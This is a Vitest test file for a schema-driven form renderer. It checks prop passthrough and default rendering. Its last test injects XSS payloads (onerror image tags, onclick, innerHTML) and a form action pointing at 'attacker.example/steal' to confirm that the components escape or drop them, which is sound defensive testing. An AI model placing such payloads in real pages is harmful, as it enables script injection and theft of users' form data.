import { describe, expect, it, vi } from 'vitest';
import { createFormFactory } from './form-factory';
import { createComponentSpec, type FormSchema } from '@schepta/core';
import simpleForm from '../../../../instances/form/simple-form.json';

const simpleFormSchema = simpleForm as unknown as FormSchema;

const customPropsSchema = {
  $id: 'component-props-form',
  type: 'object',
  'x-component': 'FormContainer',
  properties: {
    section: {
      type: 'object', 'x-component': 'FormSectionContainer', 'x-ui': { order: 1 },
      properties: {
        title: {
          type: 'object', 'x-component': 'FormSectionTitle', 'x-content': 'Custom title',
          'x-component-props': { variant: 'h5', color: 'primary' },
        },
        groups: {
          type: 'object', 'x-component': 'FormSectionGroupContainer',
          properties: {
            group: {
              type: 'object', 'x-component': 'FormSectionGroup', 'x-component-props': { columns: '1fr 1fr' },
              properties: {
                email: {
                  type: 'object', 'x-component': 'FormField', 'x-ui': { order: 1 },
                  properties: {
                    email: {
                      type: 'string', 'x-component': 'InputText',
                      'x-component-props': { label: 'Email', variant: 'outlined', helperText: 'help', fullWidth: true },
                    },
                  },
                },
              },
            },
          },
        },
      },
    },
  },
} as unknown as FormSchema;

describe('component-level schema props', () => {
  it('passes every schema prop untouched to host components', () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => undefined);
    const container = document.createElement('div');
    const titleProps: Record<string, any>[] = [];
    const inputProps: Record<string, any>[] = [];
    const externalContext = { user: 'u' };

    createFormFactory({
      container,
      schema: customPropsSchema,
      externalContext,
      components: {
        FormSectionTitle: createComponentSpec({
          id: 'FormSectionTitle', type: 'content',
          component: () => (props: Record<string, any>) => {
            titleProps.push(props);
            const heading = document.createElement('h4');
            heading.textContent = props['x-content'];
            return heading;
          },
        }),
        InputText: createComponentSpec({
          id: 'InputText', type: 'field',
          component: () => (props: Record<string, any>) => {
            inputProps.push(props);
            const hint = document.createElement('span');
            hint.textContent = props.helperText;
            return hint;
          },
        }),
      },
    });

    expect(container.querySelector('h4')?.textContent).toBe('Custom title');
    const title = titleProps[titleProps.length - 1];
    expect(title['x-content']).toBe('Custom title');
    expect(title['x-component-props']).toEqual({ variant: 'h5', color: 'primary' });
    expect(title.variant).toBe('h5');
    expect(title.color).toBe('primary');
    expect(title.externalContext).toMatchObject(externalContext);

    expect(container.querySelector('span')?.textContent).toBe('help');
    const input = inputProps[inputProps.length - 1];
    expect(input).toMatchObject({ name: 'section.email', label: 'Email', variant: 'outlined', helperText: 'help', fullWidth: true });
    expect(input.externalContext).toMatchObject(externalContext);
    expect(input.schema).toMatchObject({ type: 'string', 'x-component': 'InputText' });
    expect(typeof input.onChange).toBe('function');
    expect(warn).not.toHaveBeenCalled();
    warn.mockRestore();
  });

  it('renders simple-form.json with the default components and no dropped-prop warning', () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => undefined);
    const container = document.createElement('div');

    createFormFactory({ container, schema: simpleFormSchema, externalContext: { user: 'u' } });

    expect(container.querySelector('h3')?.textContent).toBe('Personal Information');
    const inputs = container.querySelectorAll('input');
    expect(inputs).toHaveLength(2);
    expect(inputs[0].placeholder).toBe('Enter your first name');
    expect(inputs[1].required).toBe(true);
    expect(container.querySelector('label[for="personalInfo.firstName"]')?.textContent).toBe('First Name');
    expect(warn).not.toHaveBeenCalled();
    warn.mockRestore();
  });

  it('keeps schema-controlled markup and handlers out of the default components', () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => undefined);
    const container = document.createElement('div');
    const schema = JSON.parse(JSON.stringify(simpleFormSchema));
    schema.properties.personalInfo.properties.title['x-content'] = '<img src=x onerror=alert(1)>';
    const field = schema.properties.personalInfo.properties.fields.properties.nameGroup.properties.firstName.properties.firstName;
    field['x-component-props'] = {
      label: '<img src=x onerror=alert(2)>',
      innerHTML: '<img src=x onerror=alert(3)>',
      onclick: 'alert(4)',
      formAction: 'https://attacker.example/steal',
      style: { backgroundImage: 'url(https://attacker.example/x.png)' },
    };

    createFormFactory({ container, schema });

    expect(container.querySelector('h3')?.textContent).toBe('<img src=x onerror=alert(1)>');
    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('[onclick]')).toBeNull();
    expect(container.innerHTML).not.toContain('attacker.example');
    warn.mockRestore();
  });
});
